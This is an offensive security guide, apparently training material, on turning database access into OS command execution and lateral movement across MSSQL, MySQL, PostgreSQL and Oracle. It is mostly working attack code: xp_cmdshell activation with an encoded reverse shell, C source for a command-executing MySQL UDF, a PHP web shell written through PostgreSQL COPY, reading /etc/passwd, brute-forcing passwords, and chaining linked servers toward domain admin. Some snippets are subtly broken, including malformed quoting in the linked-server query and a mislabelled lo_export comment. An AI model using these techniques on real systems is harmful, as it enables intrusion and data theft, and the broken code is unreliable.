# Database Lateral Movement and Privilege Escalation Guide

## Introduction

Database access is often the first step in a deeper network compromise. Once an attacker has database credentials or access, the database server can become a pivot point for lateral movement across the network. This guide covers techniques for escalating privileges within databases, executing OS commands through database features, chaining database access to other systems, and using database links and replication for network traversal.

## Practical Steps

### 1. MSSQL xp_cmdshell for OS Command Execution

```bash
# Connect to MSSQL and enable xp_cmdshell
sqsh -S target_ip -U sa -P 'password'
1> EXEC sp_configure 'show advanced options', 1;
2> RECONFIGURE;
3> EXEC sp_configure 'xp_cmdshell', 1;
4> RECONFIGURE;
5> xp_cmdshell 'whoami'
6> go

# Reverse shell via xp_cmdshell
1> xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAA...'
2> go

# Enumerate network via MSSQL
1> xp_cmdshell 'ipconfig /all'
2> go
1> xp_cmdshell 'net view'
3> go
1> xp_cmdshell 'net user /domain'
4> go
```

### 2. MySQL UDF (User Defined Functions) for OS Commands

```bash
# Connect to MySQL
mysql -h target_ip -u root -p

# Check plugin directory
mysql> SHOW VARIABLES LIKE 'plugin_dir';

# Create malicious UDF library (on attacker machine)
# Compile lib_mysqludf_sys.so
cat > mysql_udf.c << 'CEOF'
#include <stdio.h>
#include <stdlib.h>
#include <mysql/mysql.h>
my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) { return 0; }
void sys_exec_deinit(UDF_INIT *initid) {}
long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) return 1;
    return system(args->args[0]);
}
CEOF
gcc -shared -fPIC -o mysql_udf.so mysql_udf.c

# Upload and create UDF function
mysql> CREATE TABLE foo(line blob);
mysql> INSERT INTO foo VALUES(LOAD_FILE('/tmp/mysql_udf.so'));
mysql> SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/mysql_udf.so';
mysql> CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'mysql_udf.so';
mysql> SELECT sys_exec('id > /tmp/pwned');
```

### 3. PostgreSQL COPY and Command Execution

```bash
# Connect to PostgreSQL
psql -h target_ip -U postgres -d targetdb

# Read files via COPY
postgres=# CREATE TABLE temp_file(content text);
postgres=# COPY temp_file FROM '/etc/passwd';
postgres=# SELECT * FROM temp_file;

# Write files via COPY
postgres=# COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php';

# Execute OS commands via lo_export (superuser)
postgres=# CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS text AS '/lib/libc.so.6', 'system' LANGUAGE C STRICT;
postgres=# SELECT sys_exec('id');

# PostgreSQL large object for file upload
postgres=# SELECT lo_import('/etc/passwd');
postgres=# SELECT lo_export(16384, '/tmp/passwd_copy');
```

### 4. Oracle Database Lateral Movement

```bash
# Connect via ODAT (Oracle Database Attack Tool)
odat all -s target_ip -U scott -P tiger -d ORCL

# Execute OS commands via DBMS_SCHEDULER
sqlplus scott/tiger@target_ip:1521/ORCL
SQL> BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name => 'CMD_EXEC',
    job_type => 'EXECUTABLE',
    job_action => '/bin/bash -c "id > /tmp/pwned"',
    enabled => TRUE
  );
END;
/

# Read files via UTL_FILE
SQL> DECLARE
  f UTL_FILE.FILE_TYPE;
  buf VARCHAR2(4000);
BEGIN
  f := UTL_FILE.FOPEN('/etc', 'passwd', 'R');
  LOOP
    UTL_FILE.GET_LINE(f, buf);
    DBMS_OUTPUT.PUT_LINE(buf);
  END LOOP;
  UTL_FILE.FCLOSE(f);
EXCEPTION WHEN OTHERS THEN
  UTL_FILE.FCLOSE(f);
END;
/
```

### 5. Database Linked Server Chaining

```bash
# MSSQL linked server enumeration and chaining
sqsh -S target1 -U sa -P 'password1'
1> SELECT name, product, provider, data_source FROM sys.servers;
2> go

# Execute queries on linked server (lateral movement)
1> SELECT * FROM OPENQUERY(LINKED_SRV, 'SELECT @@version');
2> go

# Chain through multiple linked servers
1> SELECT * FROM OPENQUERY(LINKED_SRV,
2>   'SELECT * FROM OPENQUERY(LINKED_SRV2,
3>     ''SELECT * FROM OPENQUERY(LINKED_SRV3, ''''SELECT @@version'''')'')');
4> go

# Execute commands on linked server
1> SELECT * FROM OPENQUERY(LINKED_SRV,
2>   ''EXEC xp_cmdshell ''''whoami'''''');
3> go
```

### 6. Oracle TNS Listener Attack

```bash
# Enumerate Oracle TNS listener
tnscmd10g ping -h target_ip:1521
tnscmd10g version -h target_ip:1521

# Check for remote OS authentication
sqlplus /@target_ip:1521/ORCL

# SID brute force
odat sidguesser -s target_ip -p 1521

# Password brute force
odat passwordguesser -s target_ip -d ORCL -U scott --accounts-file accounts.txt
```

## Hands-on Exercises

### Exercise 1: MSSQL to Domain Admin

Starting with a MSSQL sa account, demonstrate the attack chain: enable xp_cmdshell, enumerate the domain, extract credentials, and achieve domain admin access. Document each step.

### Exercise 2: Multi-Database Pivot Chain

Given access to a MySQL database on one server and a linked PostgreSQL database on another, demonstrate lateral movement from MySQL through PostgreSQL to achieve OS command execution on the second server.

## References

- ODAT (Oracle Database Attack Tool) — https://github.com/quentinhardy/odat
- MSSQL Attack Reference — https://book.hacktricks.xyz/pentesting/pentesting-mssql
- MySQL UDF Exploitation — https://www.exploit-db.com/docs/
- PostgreSQL Attack Techniques — https://medium.com/@greenmascot
